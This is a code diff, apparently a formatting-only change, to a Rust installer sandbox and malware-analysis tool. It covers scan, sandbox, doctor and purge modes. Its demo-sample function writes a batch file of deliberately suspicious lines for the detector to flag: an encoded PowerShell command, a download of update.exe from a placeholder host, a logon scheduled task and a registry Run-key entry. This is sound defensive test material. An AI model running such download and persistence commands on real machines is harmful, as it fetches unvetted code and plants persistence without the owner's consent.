@@ -17,16 +17,20 @@ pub struct ScanOptions {
 
 /// Mode A — Local Program Inspection.
 pub fn mode_scan(opts: ScanOptions) -> Result<Value> {
-    let bridge = ReaBridge::new(ReaConfig { rea_path: opts.rea_path, timeout: None });
+    let bridge = ReaBridge::new(ReaConfig {
+        rea_path: opts.rea_path,
+        timeout: None,
+    });
     let report = bridge.analyze(&opts.target)?;
     Ok(Value::obj(vec![
         ("schema_version", Value::num(crate::SCHEMA_VERSION)),
         ("mode", Value::str("local-scan")),
         ("generated_unix", Value::num(unix_secs())),
         ("verdict", Value::str(report.verdict())),
-        ("coverage", crate::coverage::block(
-            vec![("analysis", report.scan_issues.clone())], vec![],
-        )),
+        (
+            "coverage",
+            crate::coverage::block(vec![("analysis", report.scan_issues.clone())], vec![]),
+        ),
         ("report", report.to_json()),
     ]))
 }
@@ -64,26 +68,40 @@ pub fn mode_sandbox(opts: SandboxOptions) -> Result<Value> {
     let mut purge_json = Value::Null;
     let mut purge_error: Option<String> = None;
     if opts.sandbox.keep {
-        if let Err(e) = registry.unmount() { purge_error = Some(e.to_string()); }
+        if let Err(e) = registry.unmount() {
+            purge_error = Some(e.to_string());
+        }
     } else {
         match CleanupController::purge_sandbox(&sandbox.root, Some(&mut registry), false) {
-            Ok(p) => purge_json = Value::obj(vec![
-                ("path", Value::str(p.path)),
-                ("removed", Value::Bool(p.removed)),
-                ("verified_zero_residue", Value::Bool(p.verified_zero_residue)),
-            ]),
+            Ok(p) => {
+                purge_json = Value::obj(vec![
+                    ("path", Value::str(p.path)),
+                    ("removed", Value::Bool(p.removed)),
+                    (
+                        "verified_zero_residue",
+                        Value::Bool(p.verified_zero_residue),
+                    ),
+                ])
+            }
             Err(e) => purge_error = Some(e.to_string()),
         }
     }
 
     let mut report = result?;
     if let Value::Object(map) = &mut report {
-        if let Some(w) = registry_warning { map.insert("registry_warning".into(), Value::str(w)); }
+        if let Some(w) = registry_warning {
+            map.insert("registry_warning".into(), Value::str(w));
+        }
         map.insert("purge".into(), purge_json);
-        if let Some(e) = purge_error { map.insert("purge_error".into(), Value::str(e)); }
+        if let Some(e) = purge_error {
+            map.insert("purge_error".into(), Value::str(e));
+        }
         map.insert("sandbox_kept".into(), Value::Bool(opts.sandbox.keep));
         if opts.sandbox.keep {
-            map.insert("sandbox_path".into(), Value::str(sandbox.root.display().to_string()));
+            map.insert(
+                "sandbox_path".into(),
+                Value::str(sandbox.root.display().to_string()),
+            );
         }
     }
     // Cleanup is the last phase, so the coverage summary is settled last: a
@@ -94,8 +112,12 @@ pub fn mode_sandbox(opts: SandboxOptions) -> Result<Value> {
     Ok(report)
 }
 
-fn run_sandbox_inner(opts: &SandboxOptions, sandbox: &Sandbox, install_dir: &Path,
-                     registry: &RegistrySandbox) -> Result<Value> {
+fn run_sandbox_inner(
+    opts: &SandboxOptions,
+    sandbox: &Sandbox,
+    install_dir: &Path,
+    registry: &RegistrySandbox,
+) -> Result<Value> {
     // Baseline snapshot of the (empty) install target.
     let before = Snapshot::capture(install_dir)?;
     // Baseline of the *whole* sandbox tree: installers also drop files
@@ -109,7 +131,9 @@ fn run_sandbox_inner(opts: &SandboxOptions, sandbox: &Sandbox, install_dir: &Pat
     // in the file tree says so — only the run does.
     let execution_issues = match run_issue(outcome.timed_out, outcome.exit_code) {
         Some((stage, message)) => vec![ScanIssue::new(
-            crate::util::path_to_slash_string(&opts.installer), stage, message,
+            crate::util::path_to_slash_string(&opts.installer),
+            stage,
+            message,
         )],
         None => Vec::new(),
     };
@@ -121,7 +145,9 @@ fn run_sandbox_inner(opts: &SandboxOptions, sandbox: &Sandbox, install_dir: &Pat
     // Drop our own bookkeeping areas from the whole-tree view: the install
     // dir is already reported in `delta`; tmp/work/hive are sandbox guts.
     let is_internal = |p: &str| {
-        p.starts_with("install/") || p.starts_with("tmp/") || p.starts_with("work/")
+        p.starts_with("install/")
+            || p.starts_with("tmp/")
+            || p.starts_with("work/")
             || p == "sandbox_reg.dat"
     };
     sandbox_delta.added.retain(|e| !is_internal(&e.path));
@@ -131,7 +157,10 @@ fn run_sandbox_inner(opts: &SandboxOptions, sandbox: &Sandbox, install_dir: &Pat
     sandbox_delta.unverified.retain(|e| !is_internal(&e.path));
     // 5. REA inspection of exactly what the installer changed, plus the
     // installer binary itself (its own PE/scripts are evidence too).
-    let bridge = ReaBridge::new(ReaConfig { rea_path: opts.rea_path.clone(), timeout: None });
+    let bridge = ReaBridge::new(ReaConfig {
+        rea_path: opts.rea_path.clone(),
+        timeout: None,
+    });
     let rea_report = bridge.analyze(install_dir)?;
     // The installer is evidence in its own right: a failure to read it is
     // reported, never silently dropped from the record.
@@ -153,7 +182,11 @@ fn run_sandbox_inner(opts: &SandboxOptions, sandbox: &Sandbox, install_dir: &Pat
         ("install_tree", Some(&rea_report)),
         ("drops", Some(&drops_report)),
     ];
-    let score = sources.iter().filter_map(|(_, r)| r.map(|r| r.risk_score())).max().unwrap_or(0);
+    let score = sources
+        .iter()
+        .filter_map(|(_, r)| r.map(|r| r.risk_score()))
+        .max()
+        .unwrap_or(0);
     let verdict_sources = Value::Object(
         sources
             .iter()
@@ -175,18 +208,25 @@ fn run_sandbox_inner(opts: &SandboxOptions, sandbox: &Sandbox, install_dir: &Pat
     // snapshotted in its own right, so its sandbox-side duplicate (and our
     // tmp/work bookkeeping) is dropped here.
     let sandbox_issues = |snap: &Snapshot| -> Vec<crate::rea_bridge::ScanIssue> {
-        snap.issues.iter().filter(|i| !is_internal(&i.path)).cloned().collect()
+        snap.issues
+            .iter()
+            .filter(|i| !is_internal(&i.path))
+            .cloned()
+            .collect()
     };
     // What the sandbox could not contain is what this report cannot show:
     // an elevated installer writes where we are not looking, and a hive that
     // would not mount leaves registry persistence entirely unrecorded.
-    let containment = crate::containment::to_json(
-        crate::containment::elevation(), &registry.status(),
-    );
+    let containment =
+        crate::containment::to_json(crate::containment::elevation(), &registry.status());
     let containment_issues = crate::containment::issues(&containment)
         .into_iter()
         .map(|(stage, message)| {
-            ScanIssue::new(crate::util::path_to_slash_string(&sandbox.root), stage, message)
+            ScanIssue::new(
+                crate::util::path_to_slash_string(&sandbox.root),
+                stage,
+                message,
+            )
         })
         .collect::<Vec<_>>();
 
@@ -198,7 +238,13 @@ fn run_sandbox_inner(opts: &SandboxOptions, sandbox: &Sandbox, install_dir: &Pat
             ("install-tree snapshot (after)", after.issues.clone()),
             ("sandbox snapshot (before)", sandbox_issues(&sandbox_before)),
             ("sandbox snapshot (after)", sandbox_issues(&sandbox_after)),
-            ("installer analysis", installer_report.as_ref().map(|r| r.scan_issues.clone()).unwrap_or_default()),
+            (
+                "installer analysis",
+                installer_report
+                    .as_ref()
+                    .map(|r| r.scan_issues.clone())
+                    .unwrap_or_default(),
+            ),
             ("install-tree analysis", rea_report.scan_issues.clone()),
             ("drops analysis", drops_report.scan_issues.clone()),
         ],
@@ -209,23 +255,41 @@ fn run_sandbox_inner(opts: &SandboxOptions, sandbox: &Sandbox, install_dir: &Pat
         ("schema_version", Value::num(crate::SCHEMA_VERSION)),
         ("mode", Value::str("sandbox-installer")),
         ("generated_unix", Value::num(unix_secs())),
-        ("verdict", Value::str(crate::rules::verdict_for_score(score))),
+        (
+            "verdict",
+            Value::str(crate::rules::verdict_for_score(score)),
+        ),
         ("risk_score", Value::num(score)),
         ("verdict_sources", verdict_sources),
         ("coverage", coverage),
         ("containment", containment),
-        ("installer", Value::str(opts.installer.display().to_string())),
-        ("execution", Value::obj(vec![
-            ("command", Value::str(outcome.command.clone())),
-            ("exit_code", outcome.exit_code.map(|c| Value::num(c as u64)).unwrap_or(Value::Null)),
-            ("timed_out", Value::Bool(outcome.timed_out)),
-            ("duration_ms", Value::num(outcome.duration_ms)),
-            ("stdout_tail", Value::str(outcome.stdout_tail.clone())),
-            ("stderr_tail", Value::str(outcome.stderr_tail.clone())),
-            ("stdout_bytes", Value::num(outcome.stdout_bytes)),
-            ("stderr_bytes", Value::num(outcome.stderr_bytes)),
-        ])),
-        ("installer_report", installer_report.map(|r| r.to_json()).unwrap_or(Value::Null)),
+        (
+            "installer",
+            Value::str(opts.installer.display().to_string()),
+        ),
+        (
+            "execution",
+            Value::obj(vec![
+                ("command", Value::str(outcome.command.clone())),
+                (
+                    "exit_code",
+                    outcome
+                        .exit_code
+                        .map(|c| Value::num(c as u64))
+                        .unwrap_or(Value::Null),
+                ),
+                ("timed_out", Value::Bool(outcome.timed_out)),
+                ("duration_ms", Value::num(outcome.duration_ms)),
+                ("stdout_tail", Value::str(outcome.stdout_tail.clone())),
+                ("stderr_tail", Value::str(outcome.stderr_tail.clone())),
+                ("stdout_bytes", Value::num(outcome.stdout_bytes)),
+                ("stderr_bytes", Value::num(outcome.stderr_bytes)),
+            ]),
+        ),
+        (
+            "installer_report",
+            installer_report.map(|r| r.to_json()).unwrap_or(Value::Null),
+        ),
         ("delta", delta.to_json()),
         // Files changed outside install\ but inside the sandbox (e.g. the
         // redirected profile). Anything changed outside the sandbox tree
@@ -266,12 +330,18 @@ fn analyze_drops(root: &Path, delta: &crate::snapshot::Delta) -> crate::rea_brid
             Ok(meta) if meta.is_file() => {}
             Ok(_) => {
                 scan_issues.push(ScanIssue::new(
-                    entry.path.clone(), "analysis", "no longer a regular file at analysis time",
+                    entry.path.clone(),
+                    "analysis",
+                    "no longer a regular file at analysis time",
                 ));
                 continue;
             }
             Err(e) => {
-                scan_issues.push(ScanIssue::new(entry.path.clone(), "metadata", e.to_string()));
+                scan_issues.push(ScanIssue::new(
+                    entry.path.clone(),
+                    "metadata",
+                    e.to_string(),
+                ));
                 continue;
             }
         }
@@ -282,7 +352,11 @@ fn analyze_drops(root: &Path, delta: &crate::snapshot::Delta) -> crate::rea_brid
                 }
                 files.push(file);
             }
-            Err(e) => scan_issues.push(ScanIssue::new(entry.path.clone(), "analysis", e.to_string())),
+            Err(e) => scan_issues.push(ScanIssue::new(
+                entry.path.clone(),
+                "analysis",
+                e.to_string(),
+            )),
         }
     }
     files.sort_by(|a, b| a.path.cmp(&b.path));
@@ -298,7 +372,10 @@ fn analyze_drops(root: &Path, delta: &crate::snapshot::Delta) -> crate::rea_brid
 /// Preflight checks for an offline machine: platform, temp/sandbox
 /// writability (a full create→purge rehearsal), REA discovery.
 pub fn mode_doctor(rea_path: Option<PathBuf>) -> Result<Value> {
-    let bridge = ReaBridge::new(ReaConfig { rea_path, timeout: None });
+    let bridge = ReaBridge::new(ReaConfig {
+        rea_path,
+        timeout: None,
+    });
     let rea_found = bridge.resolved_rea_path();
     // Rehearse the sandbox lifecycle in miniature.
     let rehearsal = (|| -> Result<bool> {
@@ -310,7 +387,8 @@ pub fn mode_doctor(rea_path: Option<PathBuf>) -> Result<Value> {
     // Prove the hash primitives work on *this* build, not just in CI: a
     // mangled toolchain or a bad cross-compile must be caught before an
     // operator trusts a hash in a report.
-    let sha_ok = crate::sha256::hash_bytes(b"abc") == "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad";
+    let sha_ok = crate::sha256::hash_bytes(b"abc")
+        == "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad";
     let md5_ok = crate::md5::hash_bytes(b"abc") == "900150983cd24fb0d6963f7d28e17f72";
     // imphash is only worth quoting if it matches everyone else's. These two
     // digests were produced by upstream pefile's get_imphash(); the second
@@ -320,43 +398,84 @@ pub fn mode_doctor(rea_path: Option<PathBuf>) -> Result<Value> {
         "KERNEL32.dll!Sleep".to_string(),
         "KERNEL32.dll!CreateFileW".to_string(),
         "USER32.dll!MessageBoxW".to_string(),
-    ]).as_deref() == Some("84e38f1bb1f12dd4775179ef0334737c")
+    ])
+    .as_deref()
+        == Some("84e38f1bb1f12dd4775179ef0334737c")
         && crate::rea_bridge::imphash(&[
             "wsock32.dll!#10".to_string(),
             "wsock32.dll!#11".to_string(),
             "wsock32.dll!#1".to_string(),
             "wsock32.dll!#24".to_string(),
-        ]).as_deref() == Some("5a9c08dc18a3c8d966264b0e82ff61ed");
+        ])
+        .as_deref()
+            == Some("5a9c08dc18a3c8d966264b0e82ff61ed");
     Ok(Value::obj(vec![
         ("schema_version", Value::num(3)),
         ("mode", Value::str("doctor")),
         ("version", Value::str(env!("CARGO_PKG_VERSION"))),
-        ("hashes", Value::obj(vec![
-            ("sha256_selftest", Value::Bool(sha_ok)),
-            ("md5_selftest", Value::Bool(md5_ok)),
-            ("imphash_selftest", Value::Bool(imphash_ok)),
-        ])),
+        (
+            "hashes",
+            Value::obj(vec![
+                ("sha256_selftest", Value::Bool(sha_ok)),
+                ("md5_selftest", Value::Bool(md5_ok)),
+                ("imphash_selftest", Value::Bool(imphash_ok)),
+            ]),
+        ),
         ("os", Value::str(std::env::consts::OS)),
         ("arch", Value::str(std::env::consts::ARCH)),
         // The documented advice is "run untrusted installers from a standard
         // account". Doctor states whether this session actually does, because
         // an elevated run can write past the sandbox and out of the report.
-        ("elevated", match crate::containment::elevation() {
-            Some(flag) => Value::Bool(flag),
-            None => Value::Null,
-        }),
+        (
+            "elevated",
+            match crate::containment::elevation() {
+                Some(flag) => Value::Bool(flag),
+                None => Value::Null,
+            },
+        ),
         ("windows_job_objects", Value::Bool(cfg!(windows))),
-        ("registry_hive_mount", Value::str(if cfg!(windows) {
-            "available (requires SeRestorePrivilege + a valid hive file)"
-        } else { "not applicable on this OS" })),
-        ("temp_dir", Value::str(crate::util::temp_root().display().to_string())),
-        ("sandbox_rehearsal_ok", match &rehearsal { Ok(ok) => Value::Bool(*ok), Err(_) => Value::Bool(false) }),
-        ("sandbox_rehearsal_error", rehearsal.err().map(|e| Value::str(e.to_string())).unwrap_or(Value::Null)),
-        ("rea", match rea_found {
-            Some(p) => Value::obj(vec![("found", Value::Bool(true)), ("path", Value::str(p.display().to_string()))]),
-            None => Value::obj(vec![("found", Value::Bool(false)),
-                ("path", Value::str("native analyzer fallback (fully functional offline)"))]),
-        }),
+        (
+            "registry_hive_mount",
+            Value::str(if cfg!(windows) {
+                "available (requires SeRestorePrivilege + a valid hive file)"
+            } else {
+                "not applicable on this OS"
+            }),
+        ),
+        (
+            "temp_dir",
+            Value::str(crate::util::temp_root().display().to_string()),
+        ),
+        (
+            "sandbox_rehearsal_ok",
+            match &rehearsal {
+                Ok(ok) => Value::Bool(*ok),
+                Err(_) => Value::Bool(false),
+            },
+        ),
+        (
+            "sandbox_rehearsal_error",
+            rehearsal
+                .err()
+                .map(|e| Value::str(e.to_string()))
+                .unwrap_or(Value::Null),
+        ),
+        (
+            "rea",
+            match rea_found {
+                Some(p) => Value::obj(vec![
+                    ("found", Value::Bool(true)),
+                    ("path", Value::str(p.display().to_string())),
+                ]),
+                None => Value::obj(vec![
+                    ("found", Value::Bool(false)),
+                    (
+                        "path",
+                        Value::str("native analyzer fallback (fully functional offline)"),
+                    ),
+                ]),
+            },
+        ),
     ]))
 }
 
@@ -397,7 +516,10 @@ pub fn mode_diff(before_path: &Path, after_path: &Path) -> Result<Value> {
         // cannot be checked by the person reading it.
         map.insert("before_root".into(), Value::str(before.root_label()));
         map.insert("after_root".into(), Value::str(after.root_label()));
-        map.insert("before_created_unix".into(), Value::num(before.created_unix));
+        map.insert(
+            "before_created_unix".into(),
+            Value::num(before.created_unix),
+        );
         map.insert("after_created_unix".into(), Value::num(after.created_unix));
         map.insert("coverage".into(), coverage);
     }
@@ -405,12 +527,17 @@ pub fn mode_diff(before_path: &Path, after_path: &Path) -> Result<Value> {
 }
 
 pub fn mode_purge(path: &Path, force: bool) -> Result<Value> {
-    if !path.exists() { return Err(Error::NotFound(path.to_path_buf())); }
+    if !path.exists() {
+        return Err(Error::NotFound(path.to_path_buf()));
+    }
     let report = CleanupController::purge_dir(path, force)?;
     Ok(Value::obj(vec![
         ("path", Value::str(report.path)),
         ("removed", Value::Bool(report.removed)),
-        ("verified_zero_residue", Value::Bool(report.verified_zero_residue)),
+        (
+            "verified_zero_residue",
+            Value::Bool(report.verified_zero_residue),
+        ),
     ]))
 }
 
@@ -429,11 +556,12 @@ pub fn write_sample(path: &Path, kind: &str) -> Result<PathBuf> {
             let mut text = String::new();
             text.push_str("@echo off\nrem rea-offline demo: benign sample, not a real installer\n");
             text.push_str("powershell -enc ZQBjAGgAbwAgAGgAaQA=\n");
-            text.push_str("powershell -Command \"Invoke-WebRequest https://example.invalid/update.exe\"\n");
+            text.push_str(
+                "powershell -Command \"Invoke-WebRequest https://example.invalid/update.exe\"\n",
+            );
             text.push_str("schtasks /create /tn Demo /tr demo.exe /sc onlogon\n");
             text.push_str("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Demo /d demo.exe\n");
-            text
-                .into_bytes()
+            text.into_bytes()
         }
         other => {
             return Err(Error::InvalidInput(format!(
